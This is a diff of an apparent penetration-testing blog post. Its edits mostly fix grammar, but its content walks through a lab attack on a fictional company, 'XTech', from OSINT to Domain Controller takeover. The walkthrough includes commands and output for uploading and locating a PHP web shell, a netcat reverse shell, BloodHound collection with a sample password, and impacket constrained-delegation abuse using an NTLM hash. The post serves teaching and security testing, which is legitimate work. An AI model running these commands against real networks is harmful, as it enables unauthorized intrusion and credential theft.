@@ -1222,7 +1222,7 @@
 <p>I’ve had several customers come to me before a pentest and say they  think they’re in a good shape because their vulnerability scan shows no  critical vulnerabilities and that they’re ready for a pentest, which  then leads me to getting domain administrator in fifteen minutes by just exploiting misconfigurations in AD. <a href="https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/">HAUSEC</a></p>
 </blockquote>
 <p>Active directory penetration testing it is very important in real life and PT job role, most of (at least all) the organizations have domain controller. 
-This blog will demonstrate an attack scenario of advisory compromise the domain controller of a organization from OSINT. My main focus of this scenario is in active directory penetration testing by demonstrating in how an threat actor can pivot inside the organization network and compromise the Domain Controller.</p>
+This blog will demonstrate an attack scenario of advisory compromise the domain controller of a organization from OSINT. My main focus of this scenario is the active directory penetration testing by demonstrating in how an threat actor can pivot inside the organization network and compromise the Domain Controller.</p>
 <p>An overview of the stages of exploitation: </p>
 <ol>
 <li>OSINT</li>
@@ -1239,14 +1239,14 @@ This blog will demonstrate an attack scenario of advisory compromise the domain 
 <hr />
 <h2 id="attack-scenario">Attack Scenario<a class="headerlink" href="#attack-scenario" title="Permanent link">&para;</a></h2>
 <h3 id="entry-point">Entry Point<a class="headerlink" href="#entry-point" title="Permanent link">&para;</a></h3>
-<p>XTech is an electronics-based technology company that which are well known in the country. XTech reached out a penetration testing company to conduct a Penetration test for XTech infrastructure. The type of the penetration test was external black-box and the scope was <code>xtech.com</code> with the IP Address <code>192.168.241.204</code>.</p>
+<p>XTech is an electronics-based technology company that which are well known in the country. XTech reached out a penetration testing company to conduct a penetration test for XTech infrastructure. The type of the penetration test was external black-box and the scope was <code>xtech.com</code> with the IP Address <code>192.168.241.204</code>.</p>
 <h2 id="osint">OSINT<a class="headerlink" href="#osint" title="Permanent link">&para;</a></h2>
-<p>OSINT stands for <strong>Open-Source Intelligence</strong> which means the process of gather public information about the target such as: employees names, company address, employees emails, technologies they are using and etc. </p>
+<p>OSINT stands for <strong>Open-Source Intelligence</strong> which means the process of gathering public information about the target such as: employees names, company address, employees emails, technologies they are using and etc. </p>
 <p>Starting from OSINT, here we will attempt to collect as much information we can about the company passively. We will focus to gather email addresses. Let's browse the company website and try to collect information from it. </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211218102244462.png" /></p>
 <p>By going into the "<strong>Who we are</strong>" section, we will found three different employees with their social media accounts. </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211218102644672.png" /></p>
-<p>In real world scenario email addresses can be collected from different ways. There many public OSINT tools that can be utilize to collect not only the email addresses, in addition, many other information about the target company. Example of tools that can be used: </p>
+<p>In real world scenario email addresses can be collected from different ways. There are many public OSINT tools that can be utilize to collect not only the email addresses also many other information about the target company. Example of tools that can be used: </p>
 <ul>
 <li><a href="https://google.com">Google Dorks</a>: using google search engine, try to search for any publicly available documents from targets websites. inside those document inspect the meta-data, usually you can find usernames there.</li>
 <li><a href="https://www.zoominfo.com/">zoominfo</a>: useful for collecting employees email addresses. </li>
@@ -1268,7 +1268,7 @@ This blog will demonstrate an attack scenario of advisory compromise the domain 
 <p><img alt="" src="../osint_into_da.assets/image-20211223114917040.png" /></p>
 <p>By uploading the PHP file, the website will response with the following:</p>
 <p><img alt="image-20211223115256972" src="../osint_into_da.assets/image-20211223115256972.png" /></p>
-<p>The PHP file have been uploaded, however, we don't know where it uploaded. We will need to brute force directory to find the directory that the file have been uploaded into. We can use here <code>wfuzz</code> to fuzz the directory that contains the PHP file <code>cmd.php</code> </p>
+<p>The PHP file have been uploaded, however, we don't know where it is uploaded. We will need to brute force the directories to find the directory that the file have been uploaded into. We can use here <code>wfuzz</code> to brute force the directory that contains the PHP file <code>cmd.php</code> </p>
 <div class="highlight"><pre><span></span><code>wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt  --hc <span class="m">404</span> http://192.168.241.204/FUZZ/cmd.php
 </code></pre></div>
 <p>The result of this command will be: </p>
@@ -1279,11 +1279,11 @@ ID           Response   Lines    Word       Chars       <span class="nv">Payload
 <span class="o">=====================================================================</span>
 <span class="m">000004216</span>:   <span class="m">500</span>        <span class="m">0</span> L      <span class="m">0</span> W        <span class="m">0</span> Ch        <span class="s2">&quot;uploads&quot;</span>  
 </code></pre></div>
-<p>So we found the directory <code>uploads</code>, now we can browse that directory but we will use <code>curl</code> instead to make HTTP GET request. </p>
+<p>So we found the directory <code>uploads</code>, now we can browse into that directory but we will use <code>curl</code> instead to make HTTP GET request. </p>
 <div class="highlight"><pre><span></span><code>curl <span class="s1">&#39;http://192.168.241.204/uploads/cmd.php?cmd=id&#39;</span> 
 <span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
 </code></pre></div>
-<p>Now we have obtained command execution in the server with the user <code>www-data</code>. To obtain reverse shell, we will upload <code>shell.php</code> which can found from the directory <code>/usr/share/laudanum/php/</code>. After upload it, setup <code>netcat</code> listener and browse into the uploaded PHP file. </p>
+<p>We have now command execution in the server with the user <code>www-data</code>. To obtain reverse shell, we will upload <code>shell.php</code> which can found from the directory <code>/usr/share/laudanum/php/</code>. After upload it, setup <code>netcat</code> listener and browse into the uploaded PHP file. </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211223122635646.png" /></p>
 <p>Now we obtained reverse shell on <strong>Web01</strong> host. Before enumerating the machine, first we will upgrade our shell to fully interactive shell using the following commands: </p>
 <div class="highlight"><pre><span></span><code>$ which python3
@@ -1330,7 +1330,7 @@ drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</spa
 <span class="o">)</span><span class="p">;</span>
 ?&gt;
 </code></pre></div>
-<p>Let's verify if the discovered credentials by switching to the user <code>dev01</code> using <code>su</code> command. </p>
+<p>Let's verify the discovered credentials if they are valid. We can do this by switching to the user <code>dev01</code> using <code>su</code> command. </p>
 <div class="highlight"><pre><span></span><code>www-data@web01:~/html$ su dev01
 Password: 
 dev01@web01:/var/www/html$ id 
@@ -1428,21 +1428,21 @@ socks5    <span class="m">127</span>.0.0.1 <span class="m">1080</span>
 <p><img alt="" src="../osint_into_da.assets/image-20211223153526970.png" /></p>
 <p>As seen in above screenshot, we obtained domain user <strong>Bob.baker</strong> password which is <code>P@ssw0rd@21</code>. </p>
 <h3 id="enumerate-the-domain-controller">Enumerate the Domain Controller<a class="headerlink" href="#enumerate-the-domain-controller" title="Permanent link">&para;</a></h3>
-<p>With two valid users on the domain, we can now run <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> to get dump of domain controller objects and permissions. I prefer to run BloodHound from Windows host, however, bloodhound can be run from Kali Linux using <a href="https://github.com/fox-it/BloodHound.py">Python collector</a> but it will not give all attack paths. </p>
-<ol>
+<p>With two valid users on the domain, we can now run <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> to get dump of domain controller objects and permissions. I prefer to run BloodHound from Windows host, however, bloodhound can be run from Kali Linux using <a href="https://github.com/fox-it/BloodHound.py">Python collector</a> but it will not give us all attack paths. </p>
+<ul>
 <li>Windows:</li>
-</ol>
+</ul>
 <div class="highlight"><pre><span></span><code>runas /netonly /user:xtech.local<span class="se">\b</span>ob.baker cmd
 P@ssw0rd@21
 
 .<span class="se">\b</span>loodhound.exe --collectionmethod all
 </code></pre></div>
-<ol>
+<ul>
 <li>Linux: </li>
-</ol>
+</ul>
 <div class="highlight"><pre><span></span><code>bloodhound-python -c ALL -u bob.baker -p <span class="s1">&#39;P@ssw0rd@21&#39;</span> -d xtech.local -dc <span class="m">10</span>.10.10.10
 </code></pre></div>
-<p>After collecting Domain Controller objects run BloodHound. Search for the user <strong>bob.baker</strong> and inspect his attributes.</p>
+<p>After collecting Domain Controller objects run BloodHound. Search for the user <strong>Bob.Baker</strong> and inspect his attributes.</p>
 <p><img alt="" src="../osint_into_da.assets/image-20211223160023416.png" /></p>
 <p>If we inspected his outbound control rights, we will notice that the user <code>bob.baker</code> have <strong>Generic Write</strong> privileges on the service account <strong>ExchSVC</strong></p>
 <p><img alt="" src="../osint_into_da.assets/image-20211223160145144.png" /></p>
@@ -1492,8 +1492,8 @@ P@ssw0rd@21
 <p><img alt="" src="../osint_into_da.assets/image-20211226124606191.png" /></p>
 <p>By abusing constrained delegation privileges we can impersonate the Domain Admin to authenticate on the <strong>DC01</strong>, but first we have to know which service <strong>SQLSVC</strong> is allowed to delegate. This can be done either from <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview</a>'s <code>Get-NetUser</code> or from BloodHound.  </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211226142625225.png" /></p>
-<p>So the service account <strong>SQLSVC</strong> are allowed the serivce <code>WWW/DC01</code>, we will use this service to impersonate the Domain Admin. Impacket contain a great tool called <code>getST</code> that can request a ticket. </p>
-<div class="highlight"><pre><span></span><code>proxychains impacket-getST  -impersonate administrator -spn WWW/dc01.xtech.local xtech.local/**SQLSVC** -hashes :5e76ca700abd3597ab702c0b52bacad2 -dc-ip <span class="m">10</span>.10.10.12 
+<p>So the service account <strong>SQLSVC</strong> are allowed the serivce <code>WWW/DC01</code>, we will use this service to impersonate the Domain Admin. Impacket contains a great tool called <code>getST</code> that can request a ticket. </p>
+<div class="highlight"><pre><span></span><code>proxychains impacket-getST  -impersonate administrator -spn WWW/dc01.xtech.local xtech.local/SQLSVC -hashes :5e76ca700abd3597ab702c0b52bacad2 -dc-ip <span class="m">10</span>.10.10.12 
 Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright <span class="m">2020</span> SecureAuth Corporation
 
 <span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
@@ -1520,6 +1520,7 @@ xtech.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b5
 <p><img alt="" src="../osint_into_da.assets/image-20211226141954753.png" /></p>
 <p>Or even login via RDP. </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211226142444553.png" /></p>
+<p>Now we compromised the Xtech network domain controller and we full access in the infrastructure.  </p>
 <h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
 <ol>
 <li><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained">https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained</a></li>
